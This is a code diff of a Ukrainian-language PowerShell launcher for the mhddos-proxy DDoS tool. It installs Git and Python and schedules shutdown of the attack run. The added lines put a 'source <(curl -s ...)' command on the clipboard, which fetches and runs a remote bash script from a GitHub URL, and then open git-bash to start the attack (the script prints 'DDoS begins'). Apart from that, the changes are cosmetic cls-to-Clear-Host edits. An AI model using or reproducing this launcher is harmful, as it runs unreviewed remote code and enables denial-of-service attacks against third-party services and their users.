@@ -10,7 +10,7 @@ if ($PSold -eq $true) {
 } else {$OS64bit = [System.Environment]::Is64BitOperatingSystem}
 # Write-Output "OS = $OS | PSold = $PSold | OS64bit = $OS64bit"
 $root = "$env:userprofile\Desktop\mhddos-proxy-py"
-$ddos_bash = ""
+$mhddos_bash_clipboard = "https://raw.githubusercontent.com/wazxn/mhddos-proxy-py/main/mddos.sh"
 
 #   ------------------------- function-block ------------------------
 function CheckDownloadInstall {
@@ -33,52 +33,51 @@ function CheckDownloadInstall {
             #   --------------------------------------------------------------------------------------------------------------|
             Write-Output "Завантажити [$git_filename]? Розмір: $git_mb ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
             if ($key -eq "Y" -or $key -eq "Enter") {
-                cls ; Write-Output "Завантаження $git_filename ` Розмір: $git_mb"
+                Clear-Host ; Write-Output "Завантаження $git_filename ` Розмір: $git_mb"
                 if ($PSold -eq $true) {
                     (New-Object Net.WebClient).DownloadFile("$git_url", "$root\$git_filename")
                 } else {Invoke-WebRequest "$git_url" -OutFile "$root\$git_filename"}
-            } else {cls ; return}
+            } else {Clear-Host ; return}
             #   --------------------------------------------------------------------------------------------------------------|
         } else {
             #   --------------------------------------------------------------------------------------------------------------|
             Write-Output "Встановити [$git_filename]? Розмір: $git_mb ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
             if ($key -eq "Y" -or $key -eq "Enter") {
-                cls ; Write-Output "Встановлення $git_filename ` Розмір: $git_mb"
+                Clear-Host ; Write-Output "Встановлення $git_filename ` Розмір: $git_mb"
                 Start-Process "$root\$git_filename" -ArgumentList /silent , /norestart -Verb RunAs -Wait ; Write-Output "done." ; Start-Sleep -s 1
             }
             #   --------------------------------------------------------------------------------------------------------------|
         }
     }
-    cls
+    Clear-Host
     if ( -not (Test-Path "$env:localappdata\Programs\Python\*Python*\python.exe")) {
         if ( -not (Test-Path "$root\$py_filename")) {
             #   --------------------------------------------------------------------------------------------------------------|
             Write-Output "Завантажити [$py_filename]? Розмір: $py_mb ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
             if ($key -eq "Y" -or $key -eq "Enter") {
-                cls ; Write-Output "Завантаження $py_filename" "Розмір: $py_mb"
+                Clear-Host ; Write-Output "Завантаження $py_filename" "Розмір: $py_mb"
                 if ($PSold -eq $true) {
                     (New-Object Net.WebClient).DownloadFile("$py_url", "$root\$py_filename")
                 } else {Invoke-WebRequest "$py_url" -OutFile "$root\$py_filename"}
-            } else {cls ; return}
+            } else {Clear-Host ; return}
             #   --------------------------------------------------------------------------------------------------------------|
         } else {
             #   --------------------------------------------------------------------------------------------------------------|
             Write-Output "Встановити [$py_filename]? Розмір: $py_mb ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
             if ($key -eq "Y" -or $key -eq "Enter") {
-                cls ; Write-Output "Встановлення $py_filename" "Розмір: $py_mb"
+                Clear-Host ; Write-Output "Встановлення $py_filename" "Розмір: $py_mb"
                 Start-Process "$root\$py_filename" -ArgumentList /passive , PrependPath=1 -Verb RunAs -Wait ; Write-Output "done." ; Start-Sleep -s 1
             }
             #   --------------------------------------------------------------------------------------------------------------|
         }
     }
-    cls
+    Clear-Host
 }
-
 #   --------------------------------------------------------------------------------------------------------------|
 if ( -not (Test-Path "$root")) {New-Item -Path "$root" -ItemType Directory | out-null}
 CheckDownloadInstall
 if ( -not (Test-Path "$env:programfiles\*Git*\git-bash.exe") -or -not (Test-Path "$env:localappdata\Programs\Python\*Python*\python.exe")) {
-    cls ; Write-Output "Git або Python не встановлений" ; Start-Sleep -s 2 ; cls ; Write-Output "Вихід" ; Start-Sleep -s 2 ; exit
+    Clear-Host ; Write-Output "Git або Python не встановлений" ; Start-Sleep -s 2 ; Clear-Host ; Write-Output "Вихід" ; Start-Sleep -s 2 ; exit
 }
 #   --------------------------------------------------------------------------------------------------------------|
 Write-Output "Запланувати завершення роботи програми? ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
@@ -88,13 +87,13 @@ if ($key -eq "Y" -or $key -eq "Enter") {
     Write-Output "По завершенню роботи виключити комп*ютер ` [Enter], [Y] - Так" ; $key = [Console]::ReadKey($true).Key
     if ($key -eq "Y" -or $key -eq "Enter") {$Shutdown = $true} else {$Shutdown = $false}
 }
-cls ; Write-Output "--------------- Дудос Починається ---------------"
-Set-Clipboard -Value "$ddos_bash"
+Clear-Host ; Write-Output "--------------- Дудос Починається ---------------"
+Set-Clipboard -Value "source <(curl -s $mhddos_bash_clipboard)"
 Start-Process -filepath "$env:programfiles\Git\git-bash.exe" -Wait
 if ($key -eq "Y" -or $key -eq "Enter") {
     $now = (get-date) ; $future = (get-date).AddSeconds($time) ; Write-Output "Час початку: $now" ` "Час закінчення: $future" ; Start-Sleep -s $time
     get-process | where-object {$_.MainWindowTitle -like "*c/Users*"} | stop-process
     if ($Shutdown -eq $true) {Stop-Computer -ComputerName localhost}
 }
-cls
+Clear-Host
 exit
